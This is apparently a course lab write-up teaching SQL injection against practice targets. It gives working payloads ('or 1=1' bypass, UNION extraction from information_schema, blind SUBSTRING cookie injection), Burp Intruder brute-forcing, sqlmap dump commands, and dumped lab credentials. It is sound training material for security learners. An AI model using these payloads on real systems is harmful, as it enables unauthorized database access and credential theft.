# 😛 SQL Injection

## **Beginner's Guide**

SQL Injection is a common web application vulnerability that allows attackers to interfere with the queries that an application makes to its database. In this guide, we'll explore the basics of SQL Injection and provide insights into prevention techniques.

<figure><img src="https://media.licdn.com/dms/image/D4E12AQHnzJ21JYJ-Fg/article-cover_image-shrink_720_1280/0/1689675199945?e=2147483647&#x26;v=beta&#x26;t=peB2gXckkdQtft7D7rV8QoqgMHY6VYwhBFedGxwuO6E" alt=""><figcaption></figcaption></figure>

### **1. Understanding SQL Injection**

#### **What is SQL Injection?**

SQL Injection is an attack technique where an attacker inserts malicious SQL code into a query, manipulating the database to perform unintended operations. This can lead to unauthorized access, data disclosure, and other malicious actions.

#### **How Does SQL Injection Work?**

1. **User Input Handling:**
   * Web applications often take user inputs and use them in SQL queries.
2. **Malicious Input:**
   * An attacker provides input that includes SQL code to manipulate the query.
3. **Query Manipulation:**
   * The injected SQL code alters the original query's behavior.
4.  **Unauthorized Actions:**

    * Depending on the injected code, attackers can retrieve, modify, or delete data.



<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### **2. Types of SQL Injection**

#### **Classic SQL Injection:**

* Involves injecting malicious SQL statements through user inputs.

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';
-- Attacker injects: ' OR '1'='1' --
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --';

```

#### **Blind SQL Injection:**

* Exploits a true or false condition to infer data without directly retrieving it.

```sql
SELECT * FROM users WHERE username = 'admin' AND SUBSTRING(password, 1, 1) = 'a';
-- Check if the first character of the password is 'a' --
```

### How to detect <a href="#how-to-detect-sql-injection-vulnerabilities" id="how-to-detect-sql-injection-vulnerabilities"></a>

## **Labs:**

### --UNION <a href="#lecture_heading" id="lecture_heading"></a>

<figure><img src="../../../../.gitbook/assets/image (352).png" alt=""><figcaption><p>our playground for this lab</p></figcaption></figure>

So we know there is a user Jeremy, let's try to test out how strict is the db and how verbose it is:

<figure><img src="../../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

**Basic Input Testing:**

* When we input the name "Jeremy," the database returns information about Jeremy.
* However, if we manipulate the input with a space or any other character, the database search breaks, resulting in a message like "No users found."

Let's test out if we can retrieve more infos:

<figure><img src="../../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

**SQL Injection Testing:**

* We can exploit potential vulnerabilities by injecting SQL statements into the user input.
* Statements like `jeremy' or 1=1#` or `jeremy' or 1=1-- -` demonstrate that the application is susceptible to SQL injection. In these cases, the database returns information because the injected condition is always true.

We can also pull some infos and learn more about other tables with UNION statement. Let's say we want to know how many columns are in the table:

<figure><img src="../../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

**UNION Statements for Information Gathering:**

* Employing the `UNION` statement allows us to retrieve information from other tables.
* For example, by using `jeremy' union select null,null,null#`, we determine that there are 3 columns being selected.

<figure><img src="../../../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

**Extracting Specific Information:**

* Once we know the number of columns, we can selectively extract information. For instance, `jeremy' union select null,null,version()#` allows us to retrieve the database version.

Now let's see all the tables that exist in the database

`jeremy' union select null,null,table_name from information_schema.tables#`

<figure><img src="../../../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

* `jeremy'`: Closing single quote to end the original string.
* `union select null, null, table_name`: Adds a new SELECT statement to the original query. It selects the `table_name` column from the `information_schema.tables` table, using `NULL` as placeholders for the other columns.
* `from information_schema.tables#`: Specifies the table (`information_schema.tables`) from which to retrieve data. The `#` comments out the rest of the query.

This query aims to list all the tables present in the database.

we can also modify this to see only the columns:

```
jeremy' union select null,null,column_name from information_schema.columns#
```

* Similar to the first example, but now it's targeting the `information_schema.columns` table to list all columns in the database.

This query is used to retrieve the names of all columns across all tables in the database.

Now we want to find the username/password of jeremy

<figure><img src="../../../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

explanation:&#x20;

The provided SQL injection statement is attempting to retrieve the hashed passwords from a table named `injection0x01`. Let's break down the components of the statement:

```sql
jeremy' union select null, null, password from injection0x01#
```

1. **`jeremy'`:** This part is likely the closing single quote of the user input. The apostrophe is used to close the initial string input in the SQL query.
2. **`union select null, null, password`:** The `UNION` statement combines the results of two SELECT statements. In this case, it's being used to append results to the original query. The `NULL` values in the first and second positions signify placeholders for potential additional columns to match the structure of the original query. The `password` column is selected from the `injection0x01` table.
3. **`from injection0x01#`:** This specifies the table (`injection0x01`) from which the data is to be retrieved. The `#` is a common SQL comment character, used to comment out the rest of the query. This is done to ensure that the injected part of the query doesn't interfere with the existing query structure.

So, in summary, the injection attempts to concatenate the original query with a new SELECT statement that fetches the `password` column from the `injection0x01` table. If successful, it would return the hashed passwords from that table, assuming the injection point is vulnerable to this kind of attack.

A good resource0 to see what sort of database we're attacking and an efficient cheat sheet is:&#x20;

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

### --Blind Part <a href="#lecture_heading" id="lecture_heading"></a>

Let's start by adding a scope to our  burp suite so we don't get pollution from other website requests:



<figure><img src="../../../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

now we log in to jeremy's account and capture the request:

<figure><img src="../../../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

So now let's try to play around with an SQL injection `' or 1=1#`

but be careful, we need to encode like this (you can use ctrl+u):

`username=jeremy'+or+1%3d1%23&password=jeremy`

<figure><img src="../../../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

1. **`username=jeremy'`:**
   * This is the original username provided in the input field.
2. **`'+or+1%3d1%23`:**
   * `'+` appends the single quote and the rest of the payload to the original input.
   * `or` introduces the boolean condition that is always true (`1=1`).
   * `%3d` is the URL-encoded form of the equal sign (`=`).
   * `1%23` is the URL-encoded form of the hash symbol (`#`), which comments out the rest of the query.
3. **`&password=jeremy`:**
   * This is the original password provided in the input field.

Putting it all together, the payload manipulates the original SQL query to effectively say "select everything from the users table where the condition is always true." This is a classic SQL injection technique to bypass login forms when the application doesn't properly sanitize user inputs.

Encoding in the context of SQL injection is often necessary to ensure that special characters or symbols in the injected SQL code do not interfere with the structure of the original SQL query or cause syntax errors. There are a few key reasons why encoding is important:

1. **Special Characters in URLs:**
   * URLs have reserved characters with special meanings (e.g., `&`, `=`, `?`). If you include these characters directly in your payload, they might be misinterpreted or cause parsing issues in the URL.
2. **Spaces and URL Encoding:**
   * Spaces are not allowed in URLs, and they need to be replaced. URL encoding replaces spaces with the `%20` sequence. However, in some cases, using `+` is also acceptable as a space substitute in the query parameters.
3. **Reserved Characters in SQL:**
   * SQL queries have reserved characters such as single quotes (`'`) and equal signs (`=`). If these characters are part of the payload without proper encoding, they might conflict with the syntax of the original SQL query.
4. **Comments in SQL:**
   * The hash symbol (`#`) is often used as a comment character in SQL to indicate that the rest of the line should be ignored. If you want to include a hash symbol as part of your payload, it needs to be properly encoded to `%23` to prevent premature termination of your injected code.
5. **Preventing Syntax Errors:**
   * Encoding helps to prevent syntax errors in the SQL query. Incorrectly placed or unencoded special characters can lead to a broken query, resulting in errors and potentially revealing the attempted SQL injection.
6. **URL Encoding Standards:**
   * Adhering to URL encoding standards ensures compatibility across different web applications and servers. It provides a standardized way to represent special characters in a URL.

Let's try to automate the SQL injection process using SQLMap:

in a .txt file, copy and paste the raw request from burp and save it:

<figure><img src="../../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

(don't do like me, remove the encoded request, come back to &#x20;

`username=jeremy&password=jeremy`)&#x20;

and then let's call the SQLMap tool:

```
┌──(root㉿kali)-[/home/kali/Desktop/labs]
└─# sqlmap -r req.txt
```

and we get:

```
[10:26:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[10:26:45] [WARNING] POST parameter 'password' does not seem to be injectable
[10:26:45] [CRITICAL] all tested parameters do not appear to be injectable. 
Try to increase values for '--level'/'--risk' options if you wish to perform more tests. 
If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'                                      
```

So no injectables.

Let's look back at the request,&#x20;

* There's a request containing a `Cookie` header with a specific `session` value: `6967cabefd763ac1a1a88e11159957db`.
* The content length of the response is initially observed as 1221

**SQL Injection Attempt with True Condition:**

* An attempt is made to inject SQL code into the cookie to check if the server is vulnerable.
* The injected payload is `' and 1=1#`, making the condition always true.
* After changing the cookie, the content length remains at 1221, indicating a successful SQL injection.

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#
```

Now we are going to test one by one the characters to ask yes or no questions to the server like 'is the first character a, b ,c etc and get a yes or no response. We are going to use SQL's substring function:&#x20;

```
SUBSTRING(string, start, length)
```

{% embed url="https://www.w3schools.com/sql/func_sqlserver_substring.asp" %}

**Testing Characters Using SQL Substring Function:**

* The goal is to extract information character by character using SQL's `SUBSTRING` function.
* The initial test uses the payload `' and substring('a', 1, 1) = 'a'#`.
  * This asks the server if the first character of some string (in this case, 'a') is equal to 'a'.
  * The content length remains the same (1221), indicating success, but no useful information is extracted.

if we send this:

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('a', 1, 1) = 'a'#
```

**Purpose of Character Testing:**

* The subsequent steps involve systematically testing each character to ask yes or no questions to the server.
* By incrementing the position in the substring function (`start` parameter), you can identify each character in the string one by one.

**Next Steps:**

* To make the process more interesting and informative, you would need to modify the payload to extract actual data from the database, such as usernames or passwords.
* For example, a payload like `' and substring((SELECT version()), 1, 1) = '7'#` might be used to extract the first character of the first username in the `users` table.
*   The input `' and substring((SELECT version()), 1, 1) = '7'#` is attempting to extract the first character of the result of the `SELECT version()` query and checking if it is equal to '7'. Let's break down the payload:

    * `' and substring((SELECT version()), 1, 1) = '7'#`:
      * `substring((SELECT version()), 1, 1)`: This part executes the `SELECT version()` query and extracts the first character from the result. The `1, 1` parameters indicate starting from the first character and extracting one character.
      * `= '7'`: It checks if the extracted character is equal to '7'.
      * `#`: The hash symbol is used to comment out the rest of the SQL query.

    If the content length of the response remains the same (1221 in this case), it suggests that the condition was true, indicating that the first character of the version is '7'.

The Content-Length changes so we know for a fact that the first value of the version(), is not =7

let's try 8

success

<figure><img src="../../../../.gitbook/assets/image (275).png" alt=""><figcaption></figcaption></figure>

So the SQL versions are often 8.X.X so it's not dumb to think that next character is going to be a `.` :

<figure><img src="../../../../.gitbook/assets/image (276).png" alt=""><figcaption><p>success!</p></figcaption></figure>

Let's start over and over until we have full version:

<figure><img src="../../../../.gitbook/assets/image (277).png" alt=""><figcaption></figcaption></figure>

so here we have an error message, we test the 5 strings and it errored out on the last 0, now we just have to go 1,2,3,4 until we get our correct content length:

<figure><img src="../../../../.gitbook/assets/image (278).png" alt=""><figcaption></figcaption></figure>

Success! version of SQL is 8.0.3 &#x20;

Now the version is cool but what interests us is the password.

Let's try for user `jessamy`

our new payload is:

```
Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((SELECT password from injection0x02 where username = 'jesamy'), 1, 1) = 'p'#
```

so obviously it would be to long to go all manual and try one by one a bruteforce.

So with a CRTL+i we send our request to intruder to automate the bruteforce:

select the letter to put in a variable and  then click the add button

<figure><img src="../../../../.gitbook/assets/image (279).png" alt=""><figcaption></figcaption></figure>

our variable would be the 'p'

then go in the payload section, click enter letters a to z and add them (manually this time but you can download lists for longer stuff

start the attack

<figure><img src="../../../../.gitbook/assets/image (280).png" alt=""><figcaption><p>z is the first letter </p></figcaption></figure>

While checking the content length of all the letters we now see that z is the only one that gives us a good length.

Let's try using SQLMap now&#x20;

<figure><img src="../../../../.gitbook/assets/image (281).png" alt=""><figcaption></figcaption></figure>

paste the '1' request in the file '2' and run it using command line 3

`--level=2`: This option sets the testing level for SQL injection. The testing level ranges from 1 to 5, with 1 being the least aggressive and 5 the most aggressive. In this case, `--level=2` indicates a moderate level of testing aggressiveness. This means that `sqlmap` will perform a more comprehensive and in-depth analysis compared to the default level.

Since we do cookie injection we need level 2

during the attack we get a&#x20;

```
Cookie parameter 'session' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 385 HTTP(s) requests:
---
Parameter: session (Cookie)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND 2291=2291 AND 'trQy'='trQy

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: session=6967cabefd763ac1a1a88e11159957db' AND (SELECT 5637 FROM (SELECT(SLEEP(5)))VKDL) AND 'lzSr'='lzSr
```

so let's let SQLMap work for us:&#x20;

```
┌──(root㉿kali)-[/home/kali/Desktop/labs]
└─# sqlmap -r req3.txt --level=2 --dump
```

and eventually:

```
Database: peh-labs
Table: injection0x02
[2 entries]
+---------------------+--------------+----------+----------------------------------+
| email               | password     | username | session                          |
+---------------------+--------------+----------+----------------------------------+
| jeremy@example.com  | jeremy       | jeremy   | 6967cabefd763ac1a1a88e11159957db |
| jessamy@example.com | ZWFzdGVyZWdn | jessamy  | 9dedc6891e2839a791ed37157f1241fe |
+---------------------+--------------+----------+----------------------------------+
```

### Challenge

<figure><img src="../../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

We have this basic website that we are going to test out, let's start by seeing what it allows and what it does not:

<figure><img src="../../../../.gitbook/assets/image (264).png" alt=""><figcaption><p>Name of a product well written</p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (265).png" alt=""><figcaption><p>Very case sensitive it breaks easily </p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (266).png" alt=""><figcaption><p>We found the SQLI input</p></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

We are going to try using UNION to find out how many columns there are in this table or in the query being called using `null`

<figure><img src="../../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

Hooray, now it's going to be easy -->

```
Senpai Knife Set' union select null,null,null,table_name from information_schema.tables#
```

<figure><img src="../../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

it printed out every table so we just have to pull the one that is interesting for us:

<figure><img src="../../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

```
Senpai Knife Set' union select null,null,null,username from injection0x03_users#
```

<figure><img src="../../../../.gitbook/assets/image (271).png" alt=""><figcaption><p><span data-gb-custom-inline data-tag="emoji" data-code="1f389">🎉</span></p></figcaption></figure>

```
Senpai Knife Set' union select null,null,null,password from injection0x03_users#
```

<figure><img src="../../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

Username and Password busted, now let's try using automated tools:

<figure><img src="../../../../.gitbook/assets/image (273).png" alt=""><figcaption></figcaption></figure>

Make a request on the website, capture the packet on burp and copy paste it in a .txt file                                                                                                           &#x20;

```
┌──(root㉿kali)-[/home/kali/Desktop/labs]
└─# sqlmap -r req4.txt -T injection0x03_users --dump
```

<figure><img src="../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

Success SQLI! next is XSS :clap:
